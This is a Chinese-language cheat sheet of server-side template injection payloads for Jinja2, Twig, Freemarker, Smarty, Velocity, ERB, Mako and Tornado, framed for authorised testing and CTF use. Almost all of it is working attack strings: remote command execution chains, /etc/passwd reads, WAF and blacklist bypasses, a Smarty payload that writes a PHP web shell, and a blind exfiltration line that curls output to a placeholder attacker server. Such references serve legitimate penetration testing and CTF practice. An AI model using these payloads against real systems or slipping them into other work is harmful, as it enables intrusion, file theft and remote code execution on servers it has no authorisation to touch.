# SSTI · Payload

> ⚠️ 仅用于**合法授权的安全测试**与 **CTF 赛题环境**。原理见 [原理笔记.md](原理笔记.md)。

## 第 1 步：指纹识别（一次性把下面几个都打一遍）

```
{{7*7}}
${7*7}
#{7*7}
<%= 7*7 %>
{7*7}
{{7*'7'}}
{{7*7}}${7*7}
```

| 回显 | 判断 |
| --- | --- |
| `49` 且 `{{7*'7'}}` → `7777777` | **Jinja2** |
| `49` 且 `{{7*'7'}}` → `49` | **Twig** |
| 只有 `${7*7}` → `49` | Java EL / Freemarker / Mako |
| `<%= 7*7 %>` → `49` | ERB (Ruby) |
| `{{7*7}}` 原样输出 | 没有服务端模板渲染 |

## Jinja2 / Flask（Python，最常见）

| 目的 | Payload |
| --- | --- |
| 确认可注入 | `{{7*7}}` → `49` |
| 读取配置 | `{{config}}` |
| 看当前对象 | `{{self}}` |
| 读文件 | `{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}`（下标需按环境找） |
| **命令执行（首选，最稳）** | `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` |
| 命令执行（备选 1） | `{{lipsum.__globals__['os'].popen('id').read()}}` |
| 命令执行（备选 2） | `{{cycler.__init__.__globals__.os.popen('id').read()}}` |
| 命令执行（备选 3） | `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}` |
| 命令执行（备选 4） | `{{get_flashed_messages.__globals__.__builtins__.__import__('os').popen('id').read()}}` |
| 列出可用子类 | `{{''.__class__.__mro__[1].__subclasses__()}}` |
| 不走 os 模块 | `{{''.__class__.__mro__[1].__subclasses__()[<i>]('id',shell=True,stdout=-1).communicate()}}`（找 `subprocess.Popen` 的下标） |

## 绕过（被 WAF / 黑名单拦时）

| 被拦 | 绕过写法 |
| --- | --- |
| `.` | `{{''\|attr('__class__')\|attr('__mro__')\|attr('__getitem__')(1)\|attr('__subclasses__')()}}` |
| `_` | `{{''[request.args.c]}}&c=__class__` |
| `{{` `}}` | `{%print(config)%}`、`{%if config%}1{%endif%}` |
| 引号 | `{{config.__class__.__init__.__globals__[request.args.a].popen(request.args.b).read()}}&a=os&b=id` |
| `os` 关键字 | `{{config.__class__.__init__.__globals__['o'+'s'].popen('id').read()}}` |
| `popen` 关键字 | `{{config.__class__.__init__.__globals__.os['po'+'pen']('id').read()}}` |
| `[` `]` | `.__getitem__(1)` |
| 全字符黑名单 | 用 `{%set x=...%}` 拼接，或用 `request.args`/`request.values` 从外部传整串 |
| 只允许数字/字母 | `{{()\|attr("__class__")}}` 等纯属性链写法 |

## Twig (PHP)

| 目的 | Payload |
| --- | --- |
| 命令执行（Twig 1.x） | `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}` |
| 命令执行（Twig 2.x/3.x） | `{{['id']\|filter('system')}}` |
| 备选 | `{{['id']\|map('system')\|join}}` |
| 读文件 | `{{'/etc/passwd'\|file_excerpt(1,30)}}`（需开启对应扩展） |

## Freemarker (Java)

```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","id").start()}
```

## Smarty (PHP)

```
{system('id')}
{php}system('id');{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system($_GET[1]);?>",self::clearConfig())}
```

## Velocity (Java)

```
#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
```

## ERB / Mako / Tornado

| 引擎 | Payload |
| --- | --- |
| ERB (Ruby) | `<%= system('id') %>` |
| ERB 读文件 | `<%= File.open('/etc/passwd').read %>` |
| Mako (Python) | `<%import os%>${os.popen('id').read()}` |
| Tornado (Python) | `{%import os%}{{os.popen('id').read()}}` |

## 无回显时

| 手法 | Payload |
| --- | --- |
| 时间盲验证 | `{{config.__class__.__init__.__globals__['os'].popen('sleep 5').read()}}` |
| 外带 | `{{config.__class__.__init__.__globals__['os'].popen('curl http://<你的服务器>/?x=$(id\|base64)').read()}}` |
| 写文件再访问 | `{{config.__class__.__init__.__globals__['os'].popen('id > /tmp/o').read()}}` 再想办法读回 |
